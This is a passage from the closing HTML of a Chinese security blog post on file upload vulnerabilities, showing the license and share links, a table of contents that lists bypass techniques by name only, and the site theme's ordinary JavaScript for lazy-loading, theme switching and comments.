+
+        </li>
+        </ul>
+      </div>
+    </section>
+    
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://wells.host/posts/931c692/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://wells.host/posts/931c692/&title=文件上传漏洞 - Wells's Blog&summary=概述什么是文件上传漏洞文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以向服务器上传恶意文件并进行执行，后获得执行服务端命令的能力。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。
+产生文件..."><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=文件上传漏洞 - Wells's Blog&amp;body=https://wells.host/posts/931c692/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://wells.host/posts/931c692/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/895d3c4b/">中间件漏洞</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/fe1aa8c3/">XSS</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="we11s/blog-comment" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="true" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Wells</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">什么是文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">产生文件上传漏洞的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">后端绕过-解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess%E7%BB%95%E8%BF%87"><span class="toc-text">.htaccess绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E7%AE%80%E4%BB%8B"><span class="toc-text">.htaccess简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E7%9A%84%E4%BD%9C%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="toc-text">.htaccess的作用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="toc-text">.htaccess利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E4%BD%BF%E7%94%A8%E6%A8%A1%E6%9D%BF"><span class="toc-text">.htaccess使用模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E7%BB%95%E8%BF%87"><span class="toc-text">.user.ini绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E4%BB%8B%E7%BB%8D"><span class="toc-text">.user.ini介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E4%BD%BF%E7%94%A8%E5%89%8D%E6%8F%90"><span class="toc-text">.user.ini使用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E4%BD%9C%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="toc-text">.user.ini作用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">.user.ini使用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-1"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">数字后缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%90%8E%E7%BC%80%E7%AE%80%E4%BB%8B"><span class="toc-text">数字后缀简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-text">使用条件：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">利用中间件漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">后端绕过-软件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="toc-text">PHP 00截断绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">00截断利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E7%BB%95%E8%BF%87%E7%AE%80%E4%BB%8B"><span class="toc-text">00绕过简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">00绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E4%BC%A0%E5%8F%82%E4%BF%9D%E5%AD%98%E8%B7%AF%E5%BE%84"><span class="toc-text">GET传参保存路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E4%BC%A0%E5%8F%82%E4%BF%9D%E5%AD%98%E8%B7%AF%E5%BE%84"><span class="toc-text">POST传参保存路径</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-2"><span class="toc-text">例题：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E6%A3%80%E6%B5%8B-%E4%BF%AE%E6%94%B9%E7%BB%95%E8%BF%87"><span class="toc-text">后端检测-修改绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">双写绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="toc-text">双写绕过原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-3"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">大小写后缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87-1"><span class="toc-text">大小写后缀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MIME%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-text">MIME检测绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME%E7%AE%80%E4%BB%8B"><span class="toc-text">MIME简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">MIME绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84MIME%E7%B1%BB%E5%9E%8B"><span class="toc-text">常见的MIME类型:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-4"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-text">文件头检测绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E7%AE%80%E4%BB%8B"><span class="toc-text">文件头检测绕过简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-text">常见的文件头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E6%9D%A1%E4%BB%B6"><span class="toc-text">文件头检测绕过条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-5"><span class="toc-text">例题：</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M8 10.5h8M8 14h5.5M17 3.338A9.95 9.95 0 0 0 12 2C6.477 2 2 6.477 2 12c0 1.6.376 3.112 1.043 4.453c.178.356.237.763.134 1.148l-.595 2.226a1.3 1.3 0 0 0 1.591 1.592l2.226-.596a1.63 1.63 0 0 1 1.149.133A9.96 9.96 0 0 0 12 22c5.523 0 10-4.477 10-10c0-1.821-.487-3.53-1.338-5"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
